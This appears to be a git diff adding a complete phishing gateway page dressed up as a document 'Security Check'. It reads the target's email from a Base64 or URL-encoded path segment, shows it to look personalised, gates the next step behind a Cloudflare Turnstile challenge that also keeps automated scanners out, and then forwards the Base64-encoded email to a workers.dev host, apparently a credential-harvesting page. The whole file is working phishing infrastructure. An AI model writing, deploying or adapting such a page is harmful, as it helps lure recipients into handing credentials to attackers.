@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification</title>
+    <!-- Cloudflare Turnstile Script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f7f9; margin: 0; }
+        .box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 1px solid #e2e8f0; }
+        .btn { background: #0078d4; color: white; padding: 14px 30px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        .btn:hover { background: #005a9e; }
+        /* Style for disabled button - preserves blue color but adds transparency and changes cursor */
+        .btn:disabled { 
+            background: #0078d4; 
+            opacity: 0.5; 
+            cursor: not-allowed; 
+        }
+        .btn:disabled:hover { 
+            background: #0078d4; /* Keeps same color on hover when disabled */
+        }
+        #email-display { font-weight: bold; color: #1a365d; }
+        .turnstile-container { margin: 20px 0; min-height: 65px; display: flex; justify-content: center; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color: #1a365d;">Security Check</h2>
+        <p style="color: #4a5568;">This document is intended for:<br><span id="email-display">Loading...</span></p>
+        <p style="color: #4a5568; font-size: 14px;">Please complete the security check below.</p>
+        
+        <!-- Turnstile Widget Container with YOUR Site Key -->
+        <div class="turnstile-container">
+            <div class="cf-turnstile" 
+                 data-sitekey="0x4AAAAAACFsGXUXNkYsFRn4"
+                 data-callback="onTurnstileSuccess"
+                 data-error-callback="onTurnstileError"
+                 data-theme="auto"
+                 data-size="normal">
+            </div>
+        </div>
+        
+        <!-- Button with original blue color, but disabled initially -->
+        <button class="btn" id="verifyBtn" onclick="jump()" disabled>Verify & View Document</button>
+    </div>
+
+    <script>
+        // --- Function to check if a string is valid Base64 ---
+        function isBase64(str) {
+            try {
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        // --- Function to extract and decode email from the URL path ---
+        function getEmailFromUrl() {
+            const path = window.location.pathname;
+            const parts = path.split('/');
+            const lastPart = parts[parts.length - 1];
+            
+            // 1. Try to decode as Base64 first
+            if (isBase64(lastPart)) {
+                try {
+                    const decodedEmail = atob(lastPart);
+                    console.log("Decoded from Base64:", decodedEmail);
+                    return decodedEmail;
+                } catch (e) {
+                    console.log("Base64 decoding failed, trying URL decode...");
+                }
+            }
+            
+            // 2. If not Base64 or Base64 failed, try URL decoding
+            try {
+                const decodedEmail = decodeURIComponent(lastPart);
+                console.log("Decoded from URL encoding:", decodedEmail);
+                return decodedEmail;
+            } catch (e) {
+                console.log("URL decoding failed, using fallback.");
+                return "email@example.com";
+            }
+        }
+
+        // Get and display email
+        const userEmail = getEmailFromUrl();
+        document.getElementById('email-display').textContent = userEmail;
+        console.log("Final email to display:", userEmail);
+        console.log("Full URL path:", window.location.pathname);
+
+        // --- Turnstile Callback Functions ---
+        let turnstileToken = null;
+        
+        function onTurnstileSuccess(token) {
+            console.log("Turnstile challenge passed. Token:", token);
+            turnstileToken = token;
+            document.getElementById('verifyBtn').disabled = false; // Enable the button
+        }
+        
+        function onTurnstileError() {
+            console.log("Turnstile challenge failed or encountered an error.");
+            turnstileToken = null;
+            document.getElementById('verifyBtn').disabled = true; // Keep button disabled
+        }
+
+        // --- Modified jump function (now includes token) ---
+        function jump() {
+            if (!turnstileToken) {
+                alert("Please complete the security check first.");
+                return;
+            }
+            
+            // Encode the email to Base64
+            const b64 = btoa(userEmail);
+            
+            // Append the Turnstile token to the target URL
+            const target = "https://index-w8f.jonathanakers1775.workers.dev?email=" + b64;
+            
+            window.location.replace(target);
+        }
+    </script>
+</body>
+</html>
